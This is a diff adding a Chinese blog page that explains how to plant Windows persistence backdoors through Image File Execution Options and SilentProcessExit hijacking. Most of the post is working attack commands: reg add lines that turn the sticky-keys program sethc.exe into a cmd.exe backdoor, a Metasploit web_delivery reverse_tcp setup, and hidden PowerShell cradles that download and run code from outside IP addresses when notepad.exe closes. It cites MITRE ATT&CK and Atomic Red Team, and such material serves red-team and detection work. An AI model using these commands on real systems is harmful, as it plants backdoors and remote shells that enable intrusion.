@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            Windows后门-映像劫持 |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Windows后门-映像劫持</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2019-12-20 16:50:00</span>
+        <span class="mobile">2019-12-20 16:50</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/APT/">APT</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/">后渗透</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%90%8E%E9%97%A8/">后门</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h1><p>映像劫持（IFEO，Image File Execution Options）是微软提供给开发者的一个调试功能，用于把程序加载到调试器执行，通过劫持的方式由调试程序调用启动目标进程。该功能取决于注册表项<code>Image File Execution Options</code>下的相关项。关于利用IFEO调试进程的可以参考网上的相关文章。</p>
+<p>IFEO可以通过注册表工具regedit.exe手工操作，也可以通过<a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/gflags" >GFlags工具<i class="fas fa-external-link-alt"></i></a>设置。IFEO注册表项完整路径：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</span><br></pre></td></tr></table></figure>
+
+<p>gflags工具是包含在<a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/" >Windows Debugging Tools (WinDbg)<i class="fas fa-external-link-alt"></i></a>工具包中的一个全局标志编辑器，<a class="link"   target="_blank" rel="noopener" href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi" >下载链接<i class="fas fa-external-link-alt"></i></a>，安装之后：</p>
+<ul>
+<li>双击打开gflags.exe，选择<code>Image File</code>标签</li>
+<li>在Image栏里输入你希望调试的程序名。比如<code>sethc.exe</code>，Tab键刷新</li>
+<li>勾选Debugger并输入<code>C:\windows\system32\cmd.exe</code></li>
+</ul>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/apt/aCX7dv.png"></p>
+<p>这是一个shift后门的示例。当点击应用后，sethc.exe程序会被劫持，正常情况下应该是劫持到Debugger所指定的调试器程序，由调试器程序启动目标进程，只是这里我们直接劫持使得执行的程序是cmd.exe。</p>
+<h2 id="进程静默退出监视特性"><a href="#进程静默退出监视特性" class="headerlink" title="进程静默退出监视特性"></a>进程静默退出监视特性</h2><p>从Win7开始，系统增加了<a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit" >Monitoring Silent Process Exit<i class="fas fa-external-link-alt"></i></a>特性，可以在进程静默退出时启动监视进程。其实这是给调试程序提供的事件报告功能，当程序静默退出时使用下面的几种方法进行报告。报告模式 (ReportingMode)定义如下：</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>值</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LAUNCH_MONITORPROCESS</td>
+<td>0x01</td>
+<td>检测到静默退出时，启动监视进程</td>
+</tr>
+<tr>
+<td>LOCAL_DUMP</td>
+<td>0x02</td>
+<td>检测到静默退出时，将为受监视的进程以及导致终止的创建一个转储文件</td>
+</tr>
+<tr>
+<td>NOTIFICATION</td>
+<td>0x04</td>
+<td>检测到静默退出时，会弹出一个通知提示</td>
+</tr>
+</tbody></table>
+<p>该特性开关由注册表项<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>下的<strong>GlobalFlag</strong>键值决定。</p>
+<p>其中第一种通知方式的监视进程可以由用户指定，在gflags.exe中设置：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/apt/ybAvw3.png"></p>
+<p>这个示例会在notepad程序退出时，启动一个指定的程序。此时<code>Image File Execution Options</code>项下notepad.exe项会被设置GlobalFlag标志，并且<code>SilentProcessExit</code>项下会被指定<code>MonitorProcess</code>、<code>ReportingMode</code>，决定了监控进程路径及报告方式。</p>
+<blockquote>
+<p>这种方式Autoruns监测工具的”Image Hijacks”无法检测到。</p>
+</blockquote>
+<h1 id="shift映像劫持后门"><a href="#shift映像劫持后门" class="headerlink" title="shift映像劫持后门"></a>shift映像劫持后门</h1><h2 id="后门效果1"><a href="#后门效果1" class="headerlink" title="后门效果1"></a>后门效果1</h2><p>​    连续键入5次Shift键会会执行cmd.exe弹出命令行窗口</p>
+<p><strong>操作方法：</strong></p>
+<ol>
+<li>定位到注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>下，新建一个项，项名为<code>sethc.exe</code>；</li>
+<li>在右侧新建一个字符串值(REG_SZ)，数值名称为<code>Debugger</code>，值的内容为cmd.exe的执行路径<code>C:\windows\system32\cmd.exe</code>。</li>
+</ol>
+<p><strong>命令行操作命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>恢复命令：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg delete <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="后门效果2"><a href="#后门效果2" class="headerlink" title="后门效果2"></a>后门效果2</h2><p>​    连续键入5次Shift键，正常执行sethc.exe程序，当sethc.exe点”否”退出时，会执行cmd.exe弹出命令行窗口。</p>
+<p><strong>操作方法：</strong></p>
+<ol>
+<li>定位到注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>下，新建一个项，项名为<code>sethc.exe</code>；</li>
+<li>在右侧新建一个字符串值 DWORD (REG_DWORD)，数值名称为<code>GlobalFlag</code>，值的内容为十进制512；</li>
+<li>定位到注册表<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit</code>下，新建一个项，项名为<code>sethc.exe</code>；</li>
+<li>在右侧新建一个字符串值(REG_SZ)，数值名称为<code>MonitorProcess</code>，值的内容为cmd.exe的执行路径<code>C:\windows\system32\cmd.exe</code>；</li>
+<li>继续在此处新建一个字符串值 DWORD (REG_DWORD)，数值名称为<code>ReportingMode</code>，值的内容为十进制1。</li>
+</ol>
+<p><strong>命令行操作命令：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d <span class="number">512</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot;</span> /v ReportingMode /t REG_DWORD /d <span class="number">1</span>  /f</span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot;</span> /v MonitorProcess /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>恢复命令：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg delete <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /f</span><br><span class="line">reg delete <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="其他程序的劫持"><a href="#其他程序的劫持" class="headerlink" title="其他程序的劫持"></a>其他程序的劫持</h1><p>这里是一个示例，当关闭notepad.exe时，会出发目标系统上的一个CobaltStrike木马，获得反弹shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST xxxx</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 2  (PSH)</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>执行后生成攻击命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="variable">$d</span>=<span class="built_in">new-object</span> net.webclient;<span class="variable">$d</span>.proxy=[<span class="type">Net.WebRequest</span>]::GetSystemWebProxy();<span class="variable">$d</span>.Proxy.Credentials=[<span class="type">Net.CredentialCache</span>]::DefaultCredentials;<span class="built_in">IEX</span> <span class="variable">$d</span>.downloadstring(<span class="string">&#x27;http://192.167.19.147:8080/6sT7UfJIvMu&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在目标系统注册表项添加后门</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot;</span> /v GlobalFlag /t REG_DWORD /d <span class="number">512</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v ReportingMode /t REG_DWORD /d <span class="number">1</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /d <span class="string">&quot;C:\Windows\System32\artifact.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击效果：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/apt/66.gif"></p>
+<p>使用powershell等命令也可以，不过会有个黑框一闪而过</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot;</span> /v MonitorProcess /d <span class="string">&quot;powershell.exe -nop -w hidden -c \&quot;</span><span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://47.94.173.110:80/a&#x27;</span>))\<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p> 参考</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1183/" >https://attack.mitre.org/techniques/T1183/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1183/T1183.md" >https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1183/T1183.md<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/" >https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit" >https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Windows后门-映像劫持</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2019-12-20 16:50:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2019/12/windows后门-映像劫持/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/">#后渗透</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%90%8E%E9%97%A8/">#后门</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">#权限维持</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/12/%E5%90%8E%E9%97%A8%E8%87%AA%E5%90%AF%E5%8A%A8sc/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">后门自启动sc</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2019/12/macos%E5%90%AF%E5%8A%A8%E7%A0%B4%E8%A7%A3%E7%89%88burp/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">macOS启动破解版Burp</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">映像劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E9%9D%99%E9%BB%98%E9%80%80%E5%87%BA%E7%9B%91%E8%A7%86%E7%89%B9%E6%80%A7"><span class="nav-number">1.1.</span> <span class="nav-text">进程静默退出监视特性</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shift%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8"><span class="nav-number">2.</span> <span class="nav-text">shift映像劫持后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E6%95%88%E6%9E%9C1"><span class="nav-number">2.1.</span> <span class="nav-text">后门效果1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E6%95%88%E6%9E%9C2"><span class="nav-number">2.2.</span> <span class="nav-text">后门效果2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%AB%E6%8C%81"><span class="nav-number">3.</span> <span class="nav-text">其他程序的劫持</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
